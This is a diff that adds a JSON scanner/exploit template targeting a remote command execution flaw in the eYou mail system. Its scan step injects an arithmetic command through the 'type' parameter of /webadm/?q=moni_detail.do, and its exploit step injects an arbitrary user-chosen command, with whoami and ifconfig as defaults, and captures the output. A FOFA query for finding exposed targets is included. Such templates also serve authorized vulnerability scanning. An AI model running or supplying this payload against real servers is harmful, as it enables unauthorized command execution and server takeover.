@@ -1,0 +1,81 @@
+{
+  "Name": "Eyou Mail system moni_detail.do RCE",
+  "Description": "A remote command execution vulnerability exists in the eYou email system, allowing attackers to obtain server permissions.",
+  "Product": "Eyou-Mail-system",
+  "Homepage": "http://www.eyou.com/",
+  "DisclosureDate": "2021-03-14",
+  "Author": "itardc@163.com",
+  "FofaQuery": "app=\"Eyou-Mail-system\"",
+  "Level": "3",
+  "Impact": "",
+  "Recommendation": "",
+  "References": [
+    "http://fofa.so"
+  ],
+  "HasExp": true,
+  "ExpParams": [
+    {
+      "name": "cmd",
+      "type": "createSelect",
+      "value": "whoami,/sbin/ifconfig"
+    }
+  ],
+  "ScanSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "type=1%27|expr+100000000+-+1||%27",
+        "data_type": "text",
+        "header": {"Content-Type": "application/x-www-form-urlencoded"},
+        "follow_redirect": true,
+        "method": "POST",
+        "uri": "/webadm/?q=moni_detail.do&action=gragh"
+      },
+      "ResponseTest": {
+        "checks": [
+          {
+            "bz": "",
+            "operation": "==",
+            "type": "item",
+            "value": "200",
+            "variable": "$code"
+          },
+          {
+            "bz": "",
+            "operation": "contains",
+            "type": "item",
+            "value": "99999999",
+            "variable": "$body"
+          }
+        ],
+        "operation": "AND",
+        "type": "group"
+      }
+    }
+  ],
+  "ExploitSteps": [
+    "AND",
+    {
+      "Request": {
+        "data": "type=1%27|{{{cmd}}}||%27",
+        "data_type": "text",
+        "header": {"Content-Type": "application/x-www-form-urlencoded"},
+        "follow_redirect": true,
+        "method": "POST",
+        "uri": "/webadm/?q=moni_detail.do&action=gragh"
+      },
+      "SetVariable": ["output|lastbody|regex|(?s)</html>(.*)"]
+    }
+  ],
+  "Tags": ["rce"],
+  "CVEIDs": null,
+  "CVSSScore": null,
+  "AttackSurfaces": {
+    "Application": ["Eyou-Mail-system"],
+    "Support": null,
+    "Service": null,
+    "System": null,
+    "Hardware": null
+  },
+  "Disable": false
+}
